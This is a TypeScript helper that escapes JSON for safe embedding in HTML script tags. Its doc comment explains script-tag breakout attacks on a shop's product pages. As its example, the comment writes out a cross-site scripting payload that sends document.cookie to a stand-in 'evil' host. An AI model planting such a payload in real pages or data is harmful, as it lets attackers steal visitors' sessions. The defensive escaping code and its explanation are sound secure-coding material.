/**
 * Serialise structured data for embedding in a <script> tag.
 *
 * JSON.stringify is NOT safe to drop into HTML, and this is the classic way
 * a shop gets defaced. It escapes quotes and backslashes for JSON, and
 * nothing for HTML — so a product called
 *
 *   Moon chain</script><script>fetch('https://evil/'+document.cookie)</script>
 *
 * closes our tag and opens theirs. The browser has no idea it was ever meant
 * to be data. Every visitor to that product page then runs the attacker's
 * script with the site's origin: they can read the cart, drive the checkout,
 * and steal an admin session if the owner happens to be browsing the shop.
 *
 * Escaping `<` is what stops it. `>` and `&` go too, because `]]>` ends a
 * CDATA section and an entity can reconstitute a bracket in some parsers, and
 * U+2028/U+2029 are stripped because they are literal line terminators in
 * JavaScript source but legal inside a JSON string — a mismatch that has
 * broken parsers before.
 *
 * The escapes are all inside JSON string literals, so the result is still
 * valid JSON and still valid JSON-LD: a crawler unescapes < back to `<`.
 * Nothing is lost but the attack.
 */
export function jsonLd(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}
